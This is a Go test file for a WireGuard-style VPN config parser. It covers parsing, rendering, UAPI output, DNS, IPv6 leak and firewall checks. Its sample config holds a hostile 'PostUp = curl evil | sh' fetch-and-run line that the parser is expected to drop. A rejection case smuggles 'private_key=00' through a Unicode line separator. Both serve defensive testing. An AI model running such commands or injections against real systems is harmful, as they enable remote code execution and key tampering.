package main

import (
	"fmt"
	"strings"
	"testing"
)

const sampleConfig = `[Interface]
PrivateKey = yAnz5TF+lXXJte14tji3zlMNq+hd2rYUIgJBgB3fBmk=
Address = 10.8.1.2/32, fd00::2/128
DNS = 1.1.1.1, example.lan
MTU = 1280
Jc = 4
Jmin = 10
Jmax = 50
S1 = 86
H1 = 1000-2000
I1 = <b 0xdeadbeef>
RandomTrailers = on
PostUp = curl evil | sh
FwMark = 51820

[Peer]
PublicKey = xTIBA5rboUvnH4htodjb6e697QjLERt1NAB4mZqp8Dg=
PresharedKey = HIgo9xNzJMWLKASShiTqIybxZ0U3wGLiUeJ1PKf8ykw=
AllowedIPs = 0.0.0.0/0, ::/0
Endpoint = vpn.example.com:51820
PersistentKeepalive = 25
AdvancedSecurity = on
`

func TestParseAndRender(t *testing.T) {
	c, err := parseConfig(sampleConfig)
	if err != nil {
		t.Fatal(err)
	}
	if got := strings.Join(c.Dropped, ","); got != "PostUp,FwMark,AdvancedSecurity" {
		t.Errorf("dropped = %s", got)
	}
	out := c.render(false)
	if strings.Contains(out, "PostUp") || strings.Contains(out, "FwMark") {
		t.Errorf("render kept a dropped key:\n%s", out)
	}
	again, err := parseConfig(out)
	if err != nil || again.render(false) != out {
		t.Errorf("render is not stable: %v", err)
	}
	if c.mtu() != 1280 || c.endpoint() != "vpn.example.com:51820" {
		t.Errorf("mtu %d endpoint %s", c.mtu(), c.endpoint())
	}
	if !c.fullTunnel(false) || !c.fullTunnel(true) || c.leaksIPv6() {
		t.Error("full tunnel detection")
	}
	servers, domains := c.dns()
	if len(servers) != 1 || servers[0].String() != "1.1.1.1" || len(domains) != 1 || domains[0] != "example.lan" {
		t.Errorf("dns %v %v", servers, domains)
	}
}

func TestUAPI(t *testing.T) {
	c, err := parseConfig(sampleConfig)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := c.uapi(fwmark, nil); err == nil {
		t.Error("unresolved endpoint accepted")
	}
	u, err := c.uapi(fwmark, map[string]string{"vpn.example.com:51820": "203.0.113.5:51820"})
	if err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{
		"private_key=c809f3e5317e9575c9b5ed78b638b7ce530dabe85ddab614220241801ddf0669\n",
		"jc=4\n", "h1=1000-2000\n", "i1=<b 0xdeadbeef>\n", "random_trailers=true\n",
		"fwmark=16727\n", "replace_peers=true\n", "endpoint=203.0.113.5:51820\n",
		"persistent_keepalive_interval=25\n", "allowed_ip=0.0.0.0/0\n", "allowed_ip=::/0\n",
	} {
		if !strings.Contains(u, want) {
			t.Errorf("uapi lacks %q:\n%s", want, u)
		}
	}
	if strings.Contains(u, "mtu") || strings.Contains(u, "address") || strings.Contains(u, "dns") {
		t.Errorf("uapi has helper-only keys:\n%s", u)
	}
}

func TestRejects(t *testing.T) {
	for name, text := range map[string]string{
		"no peer":        "[Interface]\nPrivateKey = yAnz5TF+lXXJte14tji3zlMNq+hd2rYUIgJBgB3fBmk=\n",
		"bad key":        "[Interface]\nPrivateKey = abc\n[Peer]\nPublicKey = xTIBA5rboUvnH4htodjb6e697QjLERt1NAB4mZqp8Dg=\n",
		"injected line":  "[Interface]\nPrivateKey = yAnz5TF+lXXJte14tji3zlMNq+hd2rYUIgJBgB3fBmk=\nI1 = a\u2028private_key=00\n[Peer]\nPublicKey = xTIBA5rboUvnH4htodjb6e697QjLERt1NAB4mZqp8Dg=\n",
		"bad endpoint":   "[Interface]\nPrivateKey = yAnz5TF+lXXJte14tji3zlMNq+hd2rYUIgJBgB3fBmk=\n[Peer]\nPublicKey = xTIBA5rboUvnH4htodjb6e697QjLERt1NAB4mZqp8Dg=\nEndpoint = host\n",
		"bad range":      "[Interface]\nPrivateKey = yAnz5TF+lXXJte14tji3zlMNq+hd2rYUIgJBgB3fBmk=\nH1 = 5-2\n[Peer]\nPublicKey = xTIBA5rboUvnH4htodjb6e697QjLERt1NAB4mZqp8Dg=\n",
		"control in val": "[Interface]\nPrivateKey = yAnz5TF+lXXJte14tji3zlMNq+hd2rYUIgJBgB3fBmk=\nI2 = a\x01b\n[Peer]\nPublicKey = xTIBA5rboUvnH4htodjb6e697QjLERt1NAB4mZqp8Dg=\n",
	} {
		if c, err := parseConfig(text); err == nil {
			// A line separator splits the line, so the injected text must not survive as its own key.
			if u, _ := c.uapi(fwmark, map[string]string{}); strings.Contains(u, "private_key=00") {
				t.Errorf("%s: injection reached uapi", name)
			} else if name != "injected line" {
				t.Errorf("%s: accepted", name)
			}
		}
	}
}

func TestTitle(t *testing.T) {
	c, err := parseConfig(titlePrefix + "Резерв | #202 · NUE\n" + sampleConfig)
	if err != nil {
		t.Fatal(err)
	}
	if c.Title != "Резерв | #202 · NUE" || !strings.HasPrefix(c.render(true), titlePrefix+"Резерв") {
		t.Errorf("title %q", c.Title)
	}
	if got := cleanTitle(" a\tb\u2028c "); got != "a b c" {
		t.Errorf("cleanTitle = %q", got)
	}
}

func TestLeaksIPv6(t *testing.T) {
	c, err := parseConfig(strings.Replace(sampleConfig, ", fd00::2/128", "", 1))
	if err != nil {
		t.Fatal(err)
	}
	if !c.leaksIPv6() {
		t.Error("expected IPv6 leak protection")
	}
}

func TestNetworks(t *testing.T) {
	nets, invalid := parseNetworkList("10.*, 192.168.0.0/16;fd00::/8 10.1.2.3 192.168.*.* 10.*.3 bogus 10.0.0.0/8")
	var got []string
	for _, n := range nets {
		got = append(got, n.String())
	}
	if strings.Join(got, " ") != "10.0.0.0/8 192.168.0.0/16 fd00::/8 10.1.2.3/32" {
		t.Errorf("networks = %v", got)
	}
	if strings.Join(invalid, " ") != "10.*.3 bogus" {
		t.Errorf("invalid = %v", invalid)
	}
}

func TestTunnelDNS(t *testing.T) {
	const keys = "[Interface]\nPrivateKey = yAnz5TF+lXXJte14tji3zlMNq+hd2rYUIgJBgB3fBmk=\nAddress = 10.8.1.2/32\n%s\n[Peer]\nPublicKey = xTIBA5rboUvnH4htodjb6e697QjLERt1NAB4mZqp8Dg=\nAllowedIPs = %s\n"
	for name, tc := range map[string]struct{ dns, allowed, want string }{
		"own servers":        {"DNS = 9.9.9.9", "0.0.0.0/0", "[9.9.9.9]"},
		"full tunnel, none":  {"", "0.0.0.0/0, ::/0", "[1.1.1.1 1.0.0.1]"},
		"split tunnel, none": {"", "10.0.0.0/8", "[]"},
		"search domain only": {"DNS = corp.example", "0.0.0.0/0", "[1.1.1.1 1.0.0.1]"},
	} {
		c, err := parseConfig(fmt.Sprintf(keys, tc.dns, tc.allowed))
		if err != nil {
			t.Fatalf("%s: %v", name, err)
		}
		if servers, _ := c.tunnelDNS(); fmt.Sprint(servers) != tc.want {
			t.Errorf("%s: servers = %v, want %s", name, servers, tc.want)
		}
	}
}

func TestFirewallOnlyForFullTunnel(t *testing.T) {
	for allowed, want := range map[string]bool{"0.0.0.0/0": true, "::/0": true, "10.0.0.0/8, fd00::/8": false} {
		c, err := parseConfig("[Interface]\nPrivateKey = yAnz5TF+lXXJte14tji3zlMNq+hd2rYUIgJBgB3fBmk=\nAddress = 10.8.1.2/32\n[Peer]\nPublicKey = xTIBA5rboUvnH4htodjb6e697QjLERt1NAB4mZqp8Dg=\nAllowedIPs = " + allowed + "\n")
		if err != nil {
			t.Fatal(err)
		}
		if got := wantsFirewall(c); got != want {
			t.Errorf("%s: wantsFirewall = %v", allowed, got)
		}
	}
}
